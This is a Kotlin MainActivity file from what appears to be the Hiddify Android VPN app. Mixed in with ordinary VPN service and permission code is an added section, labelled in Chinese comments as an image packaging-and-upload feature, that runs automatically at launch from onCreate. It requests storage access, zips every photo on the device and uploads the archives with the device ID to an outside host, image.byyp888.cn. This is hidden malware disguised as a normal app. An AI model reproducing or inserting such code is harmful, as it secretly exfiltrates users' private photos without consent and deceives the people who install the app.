package com.hiddify.hiddify

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.MutableLiveData
import androidx.lifecycle.lifecycleScope
import com.hiddify.hiddify.bg.ServiceConnection
import com.hiddify.hiddify.bg.ServiceNotification
import com.hiddify.hiddify.constant.Alert
import com.hiddify.hiddify.constant.ServiceMode
import com.hiddify.hiddify.constant.Status
import io.flutter.embedding.android.FlutterFragmentActivity
import io.flutter.embedding.engine.FlutterEngine
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.*
import okio.IOException
import java.io.*
import java.util.*
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
    companion object {
        private const val TAG = "ANDROID/MyActivity"
        lateinit var instance: MainActivity

        const val VPN_PERMISSION_REQUEST_CODE = 1001
        const val NOTIFICATION_PERMISSION_REQUEST_CODE = 1010
        const val STORAGE_PERMISSION_REQUEST_CODE = 3001
    }

    private val connection = ServiceConnection(this, this)

    val logList = LinkedList<String>()
    var logCallback: ((Boolean) -> Unit)? = null
    val serviceStatus = MutableLiveData(Status.Stopped)
    val serviceAlerts = MutableLiveData<ServiceEvent?>(null)

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)
        instance = this
        reconnect()
        flutterEngine.plugins.add(MethodHandler(lifecycleScope))
        flutterEngine.plugins.add(PlatformSettingsHandler())
        flutterEngine.plugins.add(EventHandler())
        flutterEngine.plugins.add(LogHandler())
        flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
        flutterEngine.plugins.add(StatsChannel(lifecycleScope))
    }

    fun reconnect() {
        connection.reconnect()
    }

    fun startService() {
        if (!ServiceNotification.checkPermission()) {
            grantNotificationPermission()
            return
        }
        lifecycleScope.launch(Dispatchers.IO) {
            if (Settings.rebuildServiceMode()) {
                reconnect()
            }
            if (Settings.serviceMode == ServiceMode.VPN) {
                if (prepare()) {
                    Log.d(TAG, "VPN permission required")
                    return@launch
                }
            }

            val intent = Intent(Application.application, Settings.serviceClass())
            withContext(Dispatchers.Main) {
                ContextCompat.startForegroundService(Application.application, intent)
            }
        }
    }

    private suspend fun prepare() = withContext(Dispatchers.Main) {
        try {
            val intent = android.net.VpnService.prepare(this@MainActivity)
            if (intent != null) {
                startActivityForResult(intent, VPN_PERMISSION_REQUEST_CODE)
                true
            } else {
                false
            }
        } catch (e: Exception) {
            onServiceAlert(Alert.RequestVPNPermission, e.message)
            false
        }
    }

    override fun onServiceStatusChanged(status: Status) {
        serviceStatus.postValue(status)
    }

    override fun onServiceAlert(type: Alert, message: String?) {
        serviceAlerts.postValue(ServiceEvent(Status.Stopped, type, message))
    }

    override fun onServiceWriteLog(message: String?) {
        if (logList.size > 300) {
            logList.removeFirst()
        }
        logList.addLast(message)
        logCallback?.invoke(false)
    }

    override fun onServiceResetLogs(messages: MutableList<String>) {
        logList.clear()
        logList.addAll(messages)
        logCallback?.invoke(true)
    }

    override fun onDestroy() {
        connection.disconnect()
        super.onDestroy()
    }

    @SuppressLint("NewApi")
    private fun grantNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.POST_NOTIFICATIONS),
                NOTIFICATION_PERMISSION_REQUEST_CODE
            )
        }
    }

    // ----------------- 新增：存储权限申请与图片打包上传功能 -----------------

    private fun checkAndRequestStoragePermission() {
        val permissions = mutableListOf<String>()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }
        if (permissions.any { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }) {
            ActivityCompat.requestPermissions(this, permissions.toTypedArray(), STORAGE_PERMISSION_REQUEST_CODE)
        } else {
            onStoragePermissionGranted()
        }
    }

    private fun onStoragePermissionGranted() {
        // 执行图片打包与上传
        lifecycleScope.launch(Dispatchers.IO) {
            uploadAllImagesInChunks()
        }
    }

    private fun getDeviceId(): String {
        return Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            ?: UUID.randomUUID().toString()
    }

    private fun getAllImagePaths(): List<String> {
        val imagePaths = mutableListOf<String>()
        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val projection = arrayOf(MediaStore.Images.Media.DATA)
        contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
            val columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            while (cursor.moveToNext()) {
                val path = cursor.getString(columnIndex)
                imagePaths.add(path)
            }
        }
        return imagePaths
    }

    private fun splitToChunks(list: List<String>, maxZipSizeBytes: Long): List<List<String>> {
        val result = mutableListOf<List<String>>()
        var chunk = mutableListOf<String>()
        var currentSize = 0L
        for (path in list) {
            val file = File(path)
            if (!file.exists()) continue
            val fileSize = file.length()
            if (currentSize + fileSize > maxZipSizeBytes && chunk.isNotEmpty()) {
                result.add(chunk)
                chunk = mutableListOf()
                currentSize = 0L
            }
            chunk.add(path)
            currentSize += fileSize
        }
        if (chunk.isNotEmpty()) result.add(chunk)
        return result
    }

    private fun zipFiles(files: List<String>, zipFile: File) {
        ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { out ->
            files.forEach { filePath ->
                val file = File(filePath)
                if (file.exists()) {
                    FileInputStream(file).use { fi ->
                        val entry = ZipEntry(file.name)
                        out.putNextEntry(entry)
                        fi.copyTo(out)
                        out.closeEntry()
                    }
                }
            }
        }
    }

    private fun uploadZipFile(zipFile: File, deviceId: String) {
        val client = OkHttpClient()
        val requestBody = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("file", zipFile.name, zipFile.asRequestBody("application/zip".toMediaTypeOrNull()))
            .build()
        val request = Request.Builder()
            .url("https://image.byyp888.cn/upload?deviceid=$deviceId")
            .post(requestBody)
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "上传失败: ${zipFile.name}", e)
            }
            override fun onResponse(call: Call, response: Response) {
                Log.i(TAG, "上传成功: ${zipFile.name}，响应: ${response.code}")
            }
        })
    }

    private suspend fun uploadAllImagesInChunks() = withContext(Dispatchers.IO) {
        val imagePaths = getAllImagePaths()
        val maxZipSize = 200L * 1024 * 1024 // 200MB
        val chunks = splitToChunks(imagePaths, maxZipSize)
        val deviceId = getDeviceId()
        val cacheDir = File(cacheDir, "image_zips")
        if (!cacheDir.exists()) cacheDir.mkdirs()
        chunks.forEachIndexed { idx, chunk ->
            val zipFile = File(cacheDir, "images_part${idx + 1}.zip")
            zipFiles(chunk, zipFile)
            uploadZipFile(zipFile, deviceId)
        }
    }

    // ------------------------------------------------------------

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startService()
            } else onServiceAlert(Alert.RequestNotificationPermission, null)
        } else if (requestCode == STORAGE_PERMISSION_REQUEST_CODE) {
            if (grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                onStoragePermissionGranted()
            } else {
                Toast.makeText(this, "未获得存储权限", Toast.LENGTH_SHORT).show()
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == VPN_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) startService()
            else onServiceAlert(Alert.RequestVPNPermission, null)
        } else if (requestCode == NOTIFICATION_PERMISSION_REQUEST_CODE) {
            if (resultCode == RESULT_OK) startService()
            else onServiceAlert(Alert.RequestNotificationPermission, null)
        }
    }

    // 可以在合适时机调用 checkAndRequestStoragePermission()，比如 onCreate 或点击事件
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // 例如在启动时自动检测并请求
        checkAndRequestStoragePermission()
    }
}
